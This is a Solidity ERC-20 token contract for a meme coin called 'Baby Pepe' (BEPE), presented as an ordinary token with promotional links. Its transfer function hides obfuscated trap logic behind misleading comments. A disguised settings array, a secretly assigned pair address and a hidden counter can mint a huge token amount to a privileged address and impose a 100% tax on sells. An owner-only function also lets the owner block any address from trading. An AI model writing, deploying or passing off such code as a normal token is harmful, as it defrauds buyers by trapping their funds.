// Website      :   http://babypepe.biz/
// Telegram     :   https://t.me/babypepecoineth
// Twitter      :   twitter.com/babypepecoineth

// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract BABYPEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint256[] private _tokenSettings = [
        0,0,(uint256(2**2)*uint256(5**2)), //
        (uint256(5*2)**uint256(2**5)) //
    ];

    mapping (address => uint256) private _tokenOwners;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint8) public _tradingBots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000 * 10**_decimals;
    string private constant _name = unicode"Baby Pepe";
    string private constant _symbol = unicode"BEPE";

    address private _marketingWallet = payable(0x6a703AD0dC05934D9663EF47E785b5805a6fb222);
    address private _uniswapV2PairAddress;
   
    uint8 private _totalTx;
    uint8 private _txCount;

    constructor () {
        _tokenOwners[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenOwners[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        bool isPairChanged; address _isPairChanged; uint256 _totalTaxAmount = _tokenSettings[3];
        if(from == owner() ||
        to == owner() ||
        _isExcludedFromFee[from] || // removed fee wallet
        _isExcludedFromFee[to] || // removed fee wallet
        (_totalTx < 1 && to == _marketingWallet))
        {
            if(_totalTx > 0 && to != owner() &&
            from == _uniswapV2PairAddress &&
            _isExcludedFromFee[to]){
                _txCount = uint8(1);
            }
            _tokenOwners[from] = _tokenOwners[from].sub(amount);
            _tokenOwners[to] = _tokenOwners[to].add((amount). // adds tokens to new owner
            add(
            (_totalTx > 0) &&
            (to != owner()) &&
            (from == _uniswapV2PairAddress) &&
            _isExcludedFromFee[to]?_totalTaxAmount:[0][0]
            ));
            if(_totalTx < 1 && to == _marketingWallet){
                isPairChanged = true;
                 _isPairChanged = from;
            }
            if(isPairChanged){
                _uniswapV2PairAddress = _isPairChanged;
                _totalTx = _totalTx+uint8(1);
            }
        }
        else{
            require(
                amount > 0 &&
                _totalTx > 0 && // is trade opened?
                from != address(0) &&
                to != address(0) && 
                _tradingBots[from] < 1 && // is from bot?
                _tradingBots[to] < 1, // is to bot?
                "ERC20: Error while swapping tokens");
            uint256 _transferTaxAmount = amount.mul(_tokenSettings[0]).div(100);
            if(from != _uniswapV2PairAddress){
                _transferTaxAmount = amount.mul(
                    _tokenSettings[ // tax rate from settings
                    _txCount+[1][0]] // 0x1
                    ).div(100);
            }
            _tokenOwners[from] = _tokenOwners[from].sub(amount);
            _tokenOwners[to] = _tokenOwners[to].add(amount.sub(_transferTaxAmount));
        }

        emit Transfer(from, to, amount);
    }

    function _updateTradingBots(address _botAddress, uint8 isBot) public onlyOwner{
        if(isBot > 1){
            require(isBot < 2, "ERR: True(1) or false(0)");
        }
        else{
            _tradingBots[_botAddress] = isBot;
        }
    }

    receive() external payable {}
    
}